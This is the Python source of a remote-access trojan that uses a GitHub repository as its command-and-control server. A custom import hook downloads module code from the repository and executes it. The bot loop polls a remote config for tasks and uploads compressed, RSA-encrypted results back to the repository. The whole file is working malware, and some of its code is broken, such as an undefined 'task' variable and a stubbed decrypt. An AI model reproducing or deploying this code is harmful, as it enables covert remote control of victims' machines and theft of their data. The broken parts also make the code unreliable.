import json
import base64
import sys
import time
import imp
import threading
import Queue
import zlib
import zipfile
import Config
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from github3 import login

class ReImp(object):
	def __init__(self):
		self.code = ""

	def find_module(self, fullname, path=None):
		lib = get_file(config.my_mod() + fullname)
		if lib is not None:
			self.code = lib
			return self
		return None

	def load_module(self,name):
		module = imp.new_module(name)
		exec self.code in module.__dict__
		sys.modules[name] = module
		return module

def connect():
	gh = login(token = config.my_token())
	repo = gh.repository(config.my_usr(), config.my_repo())
	return gh, repo

def get_file(path):
	try:
		gh, repo = connect()
		return decrypt(repo.file_contents(path).decoded)
	except:
		return None

def create_config():
	try:
		gh, repo = connect()
		repo.create_file(config.my_config(), config.com(), config.com())
		return 1
	except:
		return 0

def get_config():
	c_json = get_file(config.my_config())
	try:
		c_dict = json.loads(c_json)
		for mod in c_dict:
			if task['module'] not in sys.modules:
				exec("import %s" % task['module'])
		return c_dict
	except:
		return None

def clear_config():
	try:
		gh, repo = connect()
		repo.file_contents(config.my_config()).update(config.com(), config.com())
		return 1
	except:
		return 0

def push_data(data):
	try:
		gh, repo = connect()
		repo.create_file(config.my_data(), config.com(), encrypt(data))
		return 1
	except:
		return 0

def decrypt(data):
#	decoded = base64.b64decode(data)
#	compressed = zipfile.ZipFile(decoded, 'r')
#	decompressed = compressed.read(name, config.my_pwd())
#	return decompressed
	return data

def encrypt(data):
	key = config.my_pk()
	size = config.my_size()
	offset = 0
	encrypted = ""
	compressed = zlib.compress(data)
	while offset < len(compressed):
		chunk = compressed[offset:offset+size]
		if len(chunk) % size != 0:
			chunk += " " * (size - len(chunk))
		encrypted += key.encrypt(chunk)
		offset += size
	return base64.b64encode(encrypted)

def run_module(task):
		result = sys.modules[task].run()
		if result is not None:
			push_data(result)
		return

def module_runner():
	while not config.tasks.empty():
		task = config.tasks.get()
		t = threading.Thread(target=run_module, kwargs = task)
		t.start()
		if 'sleep' in task:
			time.sleep(task['sleep'])
	return

config = Config.Config()
sys.meta_path = [ReImp()]
create_config()
while True:
	if config.tasks.empty():
		config_file = get_config()
		if config_file == None:
			time.sleep(config.my_sleep())
			continue
		for task in config_file:
			config.tasks.put(task)
	if not config.tasks.empty():
		module_runner()
		clear_config()
